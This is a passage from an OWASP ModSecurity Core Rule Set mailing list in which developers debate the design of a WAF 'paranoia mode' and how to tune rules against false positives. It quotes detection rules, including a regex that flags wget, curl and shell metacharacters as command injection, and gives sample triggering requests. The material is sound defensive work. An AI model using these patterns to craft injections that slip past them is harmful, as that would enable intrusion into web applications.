opinion.

On 2/8/16, 11:20 PM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
No?l
Zindel" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on
behalf
of mail at noelzindel.org<mailto:mail at noelzindel.org>> wrote:


Hi everyone,

let me chime in on this.

From a newbie perspective, I?d argue, the 0-4 definition would make
sense

since it would be a logical choice.
You should be able to easily distinct between the paranoia rating and
the
anomaly rating through the latter?s variable-definition e.g. warning,
critical, ?

Nevertheless, Christian?s argument ?If we leave some room between the
numbers, we have room to fill them in the future.? favours 0-40.
At least for me, since I like the idea of planning way ahead.

So, from my point of view, a range of 0-40 would be the favourable
choice. But, it?s arbitrary nature would require a well-curated
documentation.

It?s good to see the community?s commitment on this and I hope to be of
any help.

Cheers,
No?l


On 08 Feb 2016, at 22:12, Christian Folini
<christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:

Thanks Chaim and Lukas!

I got positive feedback via private messages too.

The one question, where I am still unsure (and the
feedback / criticism is also split) is the question
of the good integer range for the paranoia level.
0-4 or rather 0-40.

Still not sure.

Thoughts on this question are thus very welcome.

Ahoj,

Christian


On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:

Good writeup Christian!

On 2/8/16, 2:59 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org>
on
behalf of Lukas.Funk at united-security-providers.ch<mailto:Lukas.Funk at united-security-providers.ch>> wrote:


Hi Christian and all,

I follow the discussion about the paranoia mode with great
interest. I
think it could be a good starting point for ModSecurity users which
do
not have the expert knowledge of the rules.

Looking at your proposed structure of the paranoia mode setup, I
think
it's on a good track. The structure is easy to understand!
Unfortunately I can't comment the different rules, as I don't have
much
experience with them.

Thanks to all of you putting such great effort to the CRS and I'm
really
looking forward to version 3!

Cheers, Lukas



Dear all,

With the progress we are making on the rules front, it is time to
talk
about
the way it could be implemented.
It's time for the show-me-the-code. He you go:



http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx2
3N
XMA

8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02
%2
f04
%2fowasp-modsecurity-core-rules-
paranoia-mode-mechanics-proposal/

Feedback welcome!

Christian


________________________________

This transmission may contain information that is privileged,
confidential, and/or exempt from disclosure under applicable law. If
you are not the intended recipient, you are hereby notified that any
disclosure, copying, distribution, or use of the information contained
herein (including any reliance thereon) is strictly prohibited. If you
received this transmission in error, please immediately contact the
sender and destroy the material in its entirety, whether in electronic
or hard copy format.
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>

http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZP<http://scanmail.trustwave.com/?c=4062&amp;d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZP>
Vd
MSLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinf
o%
2fowasp-modsecurity-core-rule-set

--
mailto:christian.folini at netnea.com

http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPV<http://scanmail.trustwave.com/?c=4062&amp;d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPV>
dM
SeebAdKbQ&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
twitter: @ChrFolini
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>

http://scanmail.trustwave.com/?c=4062&d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPV<http://scanmail.trustwave.com/?c=4062&amp;d=kvC51uiCoFG6D9Z7NWTJ-HkiUDGrZPV>
dM
SLLMAERYA&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%
2f
owasp-modsecurity-core-rule-set



________________________________

This transmission may contain information that is privileged,
confidential, and/or exempt from disclosure under applicable law. If you
are not the intended recipient, you are hereby notified that any
disclosure, copying, distribution, or use of the information contained
herein (including any reliance thereon) is strictly prohibited. If you
received this transmission in error, please immediately contact the
sender and destroy the material in its entirety, whether in electronic
or hard copy format.
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>

http://scanmail.trustwave.com/?c=4062&d=qrC51mJ-5yUuJU_THDo8E9rr9Bk2G9RKB
N9PIoKQJw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2f
owasp-modsecurity-core-rule-set
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
http://scanmail.trustwave.com/?c=4062&d=qrC51mJ-5yUuJU_THDo8E9rr9Bk2G9RKBN
9PIoKQJw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fow
asp-modsecurity-core-rule-set


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set<http://scanmail.trustwave.com/?c=4062&d=jaS61jeNMoShishPyBRpfuKLmpFQianyp_z-urJb1Q&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fowasp-modsecurity-core-rule-set>


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160209/84327196/attachment-0001.html>

From christian.folini at netnea.com  Tue Feb  9 18:55:19 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Tue, 9 Feb 2016 19:55:19 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
 candidate 950907 / 932100 (System command injection)
In-Reply-To: <1454420603.2320941.509590058.2A72CBFA@webmail.messagingengine.com>
References: <20160202081718.GB29931@elias>
	<1454420603.2320941.509590058.2A72CBFA@webmail.messagingengine.com>
Message-ID: <20160209185519.GA25919@elias>

Morris,

I think this would certainly be the case. What is open is the criteria
to split the file. Werner has a point in stating, that 2 files are
not enough. But this is getting complicated.

Ahoj,

Christian



On Tue, Feb 02, 2016 at 09:43:23PM +0800, Morris Taylor wrote:
> Dear Christian,
> 
>     Dividing the pm file into several parts for eliminating false
>     positive sounds good for me. Should there be another rule id for
>     carrying the pm file for being associated with the paranoia mode
>     one? Thanks!
> 
> -- 
> BR, Morris
> 
> On Tue, Feb 2, 2016, at 04:17 PM, Christian Folini wrote:
> > Hello,
> > 
> > I'd like to discuss them here one by one.
> > 
> > Controversial Paranoia Mode Candidate 950907 (2.2.X) / 932100 (3.0.0rc1)
> > msg: Sytem Command Injection
> > 
> > Rule in 2.2.9:
> > SecRule
> > REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|!REQUEST_COOKIES:/_pk_ref/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/*
> > "(?i:(?:[\;\|\`]\W*?\bcc|\b(wget|curl))\b|\/cc(?:[\'\"\|\;\`\-\s]|$))" \
> > 		"phase:2,rev:'2',ver:'OWASP_CRS/2.2.9',maturity:'9',accuracy:'8',capture,t:none,t:normalisePath,ctl:auditLogParts=+E,block,msg:'System Command Injection',id:'950907',tag:'OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION',tag:'WASCTC/WASC-31',tag:'OWASP_TOP_10/A1',tag:'PCI/6.5.2',logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',severity:'2',setvar:'tx.msg=%{rule.msg}',setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION-%{matched_var_name}=%{tx.0},skipAfter:END_COMMAND_INJECTION1"
> > 
> > Rule in 3.0.0rc1:
> > SecRule
> > REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/*
> > "@pmf os-commands.data" \
> > 	"msg:'Remote Command Execution (RCE) Attempt',\
> > 	phase:request,\
> > 	rev:'2',\
> > 	ver:'OWASP_CRS/3.0.0',\
> > 	maturity:'9',\
> > 	accuracy:'8',\
> > 	capture,\
> > 	t:none,t:normalisePath,\
> > 	ctl:auditLogParts=+E,\
> > 	block,\
> > 	id:'932100',\
> > 	tag:'application-multi',\
> > 	tag:'language-multi',\
> > 	tag:'platform-multi',\
> > 	tag:'attack-remote code execution',\
> > 	tag:'OWASP_CRS/WEB_ATTACK/COMMAND_INJECTION',\
> > 	tag:'WASCTC/WASC-31',\
> > 	tag:'OWASP_TOP_10/A1',\
> > 	tag:'PCI/6.5.2',\
> > 	logdata:'Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}',\
> > 	severity:'CRITICAL',\
> > 	chain"
> > 		SecRule MATCHED_VARS "@rx [`;\|&\r\n].*?(\.exe)?(\s+[-/])?.+[&<>\|]*?" \
> > 			"capture,\
> > 			setvar:'tx.msg=%{rule.msg}',\
> >         		setvar:tx.rce_score=+%{tx.critical_anomaly_score},\
> > 			setvar:tx.anomaly_score=+%{tx.critical_anomaly_score},\
> >         		setvar:tx.%{rule.id}-OWASP_CRS/WEB_ATTACK/RCE-%{matched_var_name}=%{tx.0}"
> > 
> > 
> > This rule is controversial for different reasons than the one in the
> > previous post.
> > 
> > It was a simple regex in 2.2.X. For 3.0.0 it has been enriched with a
> > data file:
> > https://raw.githubusercontent.com/SpiderLabs/owasp-modsecurity-crs/v3.0.0-rc1/rules/os-commands.data
> > 
> > In a response to my blogpost 
> > https://www.netnea.com/cms/2015/12/20/modsec-crs-2-2-x-vs-3-0-0-dev/
> > Chaim conceded the 3.0.0 version is still plagued by a lot of false
> > positives. Obviously so, if you look at the commands. After all, unix
> > commands are close to natural English for a good reason.
> > 
> > Now Franziska (collaborating on the paranoia mode) and I wonder if 
> > it would not make sense to split
> > os-commands.data into two or more files. The commands with few
> > false positives would remain in the standard file, commands generating
> > lots of false positives could then be moved into
> > os-commands-paranoia.data and be referenced in a separate rule
> > copying the behaviour of the standard rule.
> > 
> > Thoughts?
> > 
> > Christian
> > 
> > -- 
> > mailto:christian.folini at netnea.com
> > http://www.christian-folini.ch
> > twitter: @ChrFolini
> > _______________________________________________
> > Owasp-modsecurity-core-rule-set mailing list
> > Owasp-modsecurity-core-rule-set at lists.owasp.org
> > https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini

From christian.folini at netnea.com  Tue Feb  9 19:29:13 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Tue, 9 Feb 2016 20:29:13 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoid vs. Paranoia Mode
In-Reply-To: <93BE8A5FB0778E48BF7BF2A9B09D7A580BA9A1EB@uspEXCH02.u-s-p.local>
References: <93BE8A5FB0778E48BF7BF2A9B09D7A580BA9A1EB@uspEXCH02.u-s-p.local>
Message-ID: <20160209192913.GA26919@elias>

Lukas,

On Tue, Feb 09, 2016 at 03:35:49PM +0000, Funk, Lukas wrote:
> I was just having another look into the AuditConsole and stumbled over this screenshot: https:/gith/jwall.org/web/audit/console/screenshots/event-view2.png
> 
> What caught my eye was in the Rules Section "setvar:tx.paranoid_mode=0" and it made me curious what that is.
> I could find anything in the latest CRS and also noting in older version in the GitHub repo...

It is an artefact from an older version. It is so old, it is not even on github
(core rules were maintained on a subversion server before) anymore.

There is a minimal trace of this functionality in 2.2.X in the file
modsecurity_crs_20_protocol_violations.conf. Unfortunately, I do not
remember if it was in use with a wider set of rules.

I seem to remember it being introduced by Ryan Barnett as a means to get
tougher rules into the core ruleset. But I never saw anybody use the
mode and AFAIK Ryan did not pursue this, so it disappeared at a given
moment. I'd say the reason was lack of use.

It was not of much use in my eyes because the concept was developed far enough.

This time, the use concept is very clear and we are also providing
documentation and a guide to decide if it is worth the effort.

Hope this helps!

Christian



-- 
If you shut your door to all errors truth will be shut out.
--- Rabindranath Tagore

From modsec at spam.lifeforms.nl  Tue Feb  9 20:05:34 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Tue, 9 Feb 2016 21:05:34 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
	Proposal
In-Reply-To: <20160208211212.GB29344@elias>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com>
	<20160208211212.GB29344@elias>
Message-ID: <6C4C307E-6167-42DC-8A7C-E0C2DC464F27@spam.lifeforms.nl>

It?s a bit of a bikeshed subject, but I think a few levels is better. I think it would be a tricky future if we'd have to say things like: ?hmmm, this rule is too heavy for 10 but too light for 15, let?s put it at 13?. How would a novice user ever guess the effects? Most people will pick one number and then troubleshoot.

We are brainstorming a lot about rules and parameters but we don?t have consensus on definitions first. If we have an integer scale with so many levels it might be very hard to describe what happens at a level. If we have just a few levels, we can provide definitions. What about this:

paranoia level 0: we try blocking definite attacks with small chance of false positives (default)
paranoia level 1: we will be strict about protocol anomalies, this might cause some special clients like loadbalancers and scanners to cause false positives
paranoia level 2: we will start blocking on suspicious heuristics which aren?t indicative of a certain attack but can be suspicious (e.g. use of MANY special characters; low-value PHP keywords and OS commands)
paranoia level 3: the CRS will apply stricter heuristics (e.g. use of SOME special characters)
paranoia level 4: the CRS will be the most strict

Then, we could easily document and maintain our paranoia decisions.
We could make a table like this, so sysadmins know exactly what is happening:

ruleId
0
1
2
3
4
what would trigger?
920300
allowed
warning
warning
block
block
no Accept header
920350
allowed
warning
warning
block
block
Host is IP4 address
931130
allowed
allowed
block
block
block
/?url=http://example.com
9123456
allowed
allowed
block on 40 chars
block on 10 chars
block on 1 char
/?id=%00blah

This clarity is something you lose if you can go to 40 levels.

Cheers,
WH

> On 08 Feb 2016, at 22:12, Christian Folini <christian.folini at netnea.com> wrote:
> 
> Thanks Chaim and Lukas!
> 
> I got positive feedback via private messages too.
> 
> The one question, where I am still unsure (and the
> feedback / criticism is also split) is the question
> of the good integer range for the paranoia level.
> 0-4 or rather 0-40.
> 
> Still not sure.
> 
> Thoughts on this question are thus very welcome.
> 
> Ahoj,
> 
> Christian
> 
> 
> On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:
>> Good writeup Christian!
>> 
>> On 2/8/16, 2:59 AM,
>> "owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on behalf of
>> Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org on
>> behalf of Lukas.Funk at united-security-providers.ch> wrote:
>> 
>>> Hi Christian and all,
>>> 
>>> I follow the discussion about the paranoia mode with great interest. I
>>> think it could be a good starting point for ModSecurity users which do
>>> not have the expert knowledge of the rules.
>>> 
>>> Looking at your proposed structure of the paranoia mode setup, I think
>>> it's on a good track. The structure is easy to understand!
>>> Unfortunately I can't comment the different rules, as I don't have much
>>> experience with them.
>>> 
>>> Thanks to all of you putting such great effort to the CRS and I'm really
>>> looking forward to version 3!
>>> 
>>> Cheers, Lukas
>>> 
>>> 
>>>>> Dear all,
>>>>> 
>>>>> With the progress we are making on the rules front, it is time to talk
>>>>> about
>>>>> the way it could be implemented.
>>>>> It's time for the show-me-the-code. He you go:
>>>>> 
>>>>> 
>>>>> http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx23NXMA
>>>>> 8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02%2f04
>>>>> %2fowasp-modsecurity-core-rules-
>>>>> paranoia-mode-mechanics-proposal/
>>>>> 
>>>>> Feedback welcome!
>>>>> 
>>>>> Christian
>> 
>> 
>> ________________________________
>> 
>> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
> 
> -- 
> mailto:christian.folini at netnea.com
> http://www.christian-folini.ch
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160209/c6cab53a/attachment-0001.html>

From Manuel.LeosRivas at gemalto.com  Tue Feb  9 20:16:48 2016
From: Manuel.LeosRivas at gemalto.com (Leos Rivas Manuel)
Date: Tue, 9 Feb 2016 20:16:48 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoid vs. Paranoia Mode
In-Reply-To: <20160209192913.GA26919@elias>
References: <93BE8A5FB0778E48BF7BF2A9B09D7A580BA9A1EB@uspEXCH02.u-s-p.local>
	<20160209192913.GA26919@elias>
Message-ID: <E2C9913D99137A42A2A9646B1E82B8DB010D42BD20@A1GTOEMBXV001.gto.a3c.atos.net>

Hi Christian,

That was used back a few years ago to either do full inspection or just inspect a few things or tighten some settings like this one

SecRule TX:PARANOID_MODE "@eq 1" "chain,phase:2,rev:'2.1.2',block,msg:'Invalid character in request',id:'960018',tag:'PROTOCOL_VIOLATION/EVASION',tag:'WASCTC/WASC-28',tag:'OWASP_TOP_10/A1',tag:'OWASP_AppSensor/CIE3',tag:'PCI/6.5.2',severity:'4',t:none,t:urlDecodeUni,tag:'http://i-technica.com/whitestuff/asciichart.html'"
        SecRule REQUEST_URI|REQUEST_BODY|REQUEST_HEADERS_NAMES|REQUEST_HEADERS|!REQUEST_HEADERS:Referer|TX:HPP_DATA \
                "@validateByteRange 32-126" \

-----Original Message-----
From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Christian Folini
Sent: mardi 9 f?vrier 2016 20:29
To: Funk, Lukas
Cc: Owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoid vs. Paranoia Mode

Lukas,

On Tue, Feb 09, 2016 at 03:35:49PM +0000, Funk, Lukas wrote:
> I was just having another look into the AuditConsole and stumbled over
> this screenshot:
> https:/gith/jwall.org/web/audit/console/screenshots/event-view2.png
>
> What caught my eye was in the Rules Section "setvar:tx.paranoid_mode=0" and it made me curious what that is.
> I could find anything in the latest CRS and also noting in older version in the GitHub repo...

It is an artefact from an older version. It is so old, it is not even on github (core rules were maintained on a subversion server before) anymore.

There is a minimal trace of this functionality in 2.2.X in the file modsecurity_crs_20_protocol_violations.conf. Unfortunately, I do not remember if it was in use with a wider set of rules.

I seem to remember it being introduced by Ryan Barnett as a means to get tougher rules into the core ruleset. But I never saw anybody use the mode and AFAIK Ryan did not pursue this, so it disappeared at a given moment. I'd say the reason was lack of use.

It was not of much use in my eyes because the concept was developed far enough.

This time, the use concept is very clear and we are also providing documentation and a guide to decide if it is worth the effort.

Hope this helps!

Christian



--
If you shut your door to all errors truth will be shut out.
--- Rabindranath Tagore
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list Owasp-modsecurity-core-rule-set at lists.owasp.org
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set
________________________________
 This message and any attachments are intended solely for the addressees and may contain confidential information. Any unauthorized use or disclosure, either whole or partial, is prohibited.
E-mails are susceptible to alteration. Our company shall not be liable for the message if altered, changed or falsified. If you are not the intended recipient of this message, please delete it and notify the sender.
Although all reasonable efforts have been made to keep this transmission free from viruses, the sender will not be liable for damages caused by a transmitted virus.

From Manuel.LeosRivas at gemalto.com  Tue Feb  9 20:41:13 2016
From: Manuel.LeosRivas at gemalto.com (Leos Rivas Manuel)
Date: Tue, 9 Feb 2016 20:41:13 +0000
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode:
	Mechanics	Proposal
In-Reply-To: <6C4C307E-6167-42DC-8A7C-E0C2DC464F27@spam.lifeforms.nl>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com>	<20160208211212.GB29344@elias>
	<6C4C307E-6167-42DC-8A7C-E0C2DC464F27@spam.lifeforms.nl>
Message-ID: <E2C9913D99137A42A2A9646B1E82B8DB010D42BE06@A1GTOEMBXV001.gto.a3c.atos.net>

I agree, keeping that many different levels will be complex to maintain and difficult to understand, the idea of a table to see the difference looks good to me.

Regards,
Manuel

From: owasp-modsecurity-core-rule-set-bounces at lists.owasp.org [mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org] On Behalf Of Walter Hop
Sent: mardi 9 f?vrier 2016 21:06
To: owasp-modsecurity-core-rule-set at lists.owasp.org
Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics Proposal

It?s a bit of a bikeshed subject, but I think a few levels is better. I think it would be a tricky future if we'd have to say things like: ?hmmm, this rule is too heavy for 10 but too light for 15, let?s put it at 13?. How would a novice user ever guess the effects? Most people will pick one number and then troubleshoot.

We are brainstorming a lot about rules and parameters but we don?t have consensus on definitions first. If we have an integer scale with so many levels it might be very hard to describe what happens at a level. If we have just a few levels, we can provide definitions. What about this:

paranoia level 0: we try blocking definite attacks with small chance of false positives (default)
paranoia level 1: we will be strict about protocol anomalies, this might cause some special clients like loadbalancers and scanners to cause false positives
paranoia level 2: we will start blocking on suspicious heuristics which aren?t indicative of a certain attack but can be suspicious (e.g. use of MANY special characters; low-value PHP keywords and OS commands)
paranoia level 3: the CRS will apply stricter heuristics (e.g. use of SOME special characters)
paranoia level 4: the CRS will be the most strict

Then, we could easily document and maintain our paranoia decisions.
We could make a table like this, so sysadmins know exactly what is happening:

ruleId

0

1

2

3

4

what would trigger?

920300

allowed

warning

warning

block

block

no Accept header

920350

allowed

warning

warning

block

block

Host is IP4 address

931130

allowed

allowed

block

block

block

/?url=http://example.com

9123456

allowed

allowed

block on 40 chars

block on 10 chars

block on 1 char

/?id=%00blah


This clarity is something you lose if you can go to 40 levels.

Cheers,
WH

On 08 Feb 2016, at 22:12, Christian Folini <christian.folini at netnea.com<mailto:christian.folini at netnea.com>> wrote:

Thanks Chaim and Lukas!

I got positive feedback via private messages too.

The one question, where I am still unsure (and the
feedback / criticism is also split) is the question
of the good integer range for the paranoia level.
0-4 or rather 0-40.

Still not sure.

Thoughts on this question are thus very welcome.

Ahoj,

Christian


On Mon, Feb 08, 2016 at 02:31:47PM +0000, Chaim Sanders wrote:

Good writeup Christian!

On 2/8/16, 2:59 AM,
"owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on behalf of
Funk, Lukas" <owasp-modsecurity-core-rule-set-bounces at lists.owasp.org<mailto:owasp-modsecurity-core-rule-set-bounces at lists.owasp.org> on
behalf of Lukas.Funk at united-security-providers.ch<mailto:Lukas.Funk at united-security-providers.ch>> wrote:


Hi Christian and all,

I follow the discussion about the paranoia mode with great interest. I
think it could be a good starting point for ModSecurity users which do
not have the expert knowledge of the rules.

Looking at your proposed structure of the paranoia mode setup, I think
it's on a good track. The structure is easy to understand!
Unfortunately I can't comment the different rules, as I don't have much
experience with them.

Thanks to all of you putting such great effort to the CRS and I'm really
looking forward to version 3!

Cheers, Lukas



Dear all,

With the progress we are making on the rules front, it is time to talk
about
the way it could be implemented.
It's time for the show-me-the-code. He you go:


http://scanmail.trustwave.com/?c=4062&d=tN-41hG4qCjBMKf0XEE90boFBx23NXMA
8kit7zcE9Q&s=5&u=https%3a%2f%2fwww%2enetnea%2ecom%2fcms%2f2016%2f02%2f04
%2fowasp-modsecurity-core-rules-
paranoia-mode-mechanics-proposal/

Feedback welcome!

Christian


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

--
mailto:christian.folini at netnea.com
http://www.christian-folini.ch
twitter: @ChrFolini
_______________________________________________
Owasp-modsecurity-core-rule-set mailing list
Owasp-modsecurity-core-rule-set at lists.owasp.org<mailto:Owasp-modsecurity-core-rule-set at lists.owasp.org>
https://lists.owasp.org/mailman/listinfo/owasp-modsecurity-core-rule-set

--
Walter Hop | PGP key: https://lifeforms.nl/pgp

________________________________
This message and any attachments are intended solely for the addressees and may contain confidential information. Any unauthorized use or disclosure, either whole or partial, is prohibited.
E-mails are susceptible to alteration. Our company shall not be liable for the message if altered, changed or falsified. If you are not the intended recipient of this message, please delete it and notify the sender.
Although all reasonable efforts have been made to keep this transmission free from viruses, the sender will not be liable for damages caused by a transmitted virus.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160209/158f2b34/attachment-0001.html>

From modsec at spam.lifeforms.nl  Tue Feb  9 21:29:54 2016
From: modsec at spam.lifeforms.nl (Walter Hop)
Date: Tue, 9 Feb 2016 22:29:54 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Controversial
	candidate 950120 / 931130 (Possible RFI)
In-Reply-To: <20160207192339.GB30297@elias>
References: <20160202080600.GA29931@elias>
	<44545D09-6265-438E-B743-5564241D5336@spam.lifeforms.nl>
	<20160207192339.GB30297@elias>
Message-ID: <484E224E-34B2-44FB-B694-EFDD93A5B105@spam.lifeforms.nl>

> Just to make sure we are on the same boat: This
> rule triggers on any argument containing a URI
> which does not start with a FQDN identical with the
> host-header of the request. Am I right?

Yes :)

> 2) In the basic set, clone this rule, but ensure it doesn?t work on ARGS:url
> I understand your reasoning. But is not that too much fiddling?
> Or is ARGS:url that common? I have the same functionality on 
> ARGS:target
> ARGS:remote
> ARGS:back
> ...
> 
> Can't we leave that sort of tuning to the sysadmins? Why don't we simply move the rule from standard to paranoia mode as it has too many false positives.

Well, such a tuning was just one proposal to reduce FP for non-paranoid users so it might tip the balance in favor of keeping the rule in base. (Moving it to paranoid is just one possible way to change the FP / protection balance)

I?m not 100% sure we should go very far with whitelistings in the default set. But there is some precedent (excluding Google Analytics cookies, formerly also Piwik I think). The CRS does carve little holes sometimes in order to deal with reality of the current web and still be strict on the rest (while commercial WAFs are necessarily much less strict on this, since it causes them too many support calls).

I would hate to see the rule totally disappear from base just on my one FP note though. Maybe more people can check their audit logs for the rule since it?s in CRSv2 too. It does rule out a lot of exploits on legacy / in house PHP apps and attackers try it daily. So it?s a hard call...

-- 
Walter Hop | PGP key: https://lifeforms.nl/pgp

-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160209/7f634c83/attachment.html>

From christian.folini at netnea.com  Wed Feb 10 06:29:42 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Wed, 10 Feb 2016 07:29:42 +0100
Subject: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Mechanics
 Proposal
In-Reply-To: <6C4C307E-6167-42DC-8A7C-E0C2DC464F27@spam.lifeforms.nl>
References: <20160204095200.GA28896@elias>
	<93BE8A5FB0778E48BF7BF2A9B09D7A580BA99C3A@uspEXCH02.u-s-p.local>
	<D2DE10F9.17557%csanders@trustwave.com>
	<20160208211212.GB29344@elias>
	<6C4C307E-6167-42DC-8A7C-E0C2DC464F27@spam.lifeforms.nl>
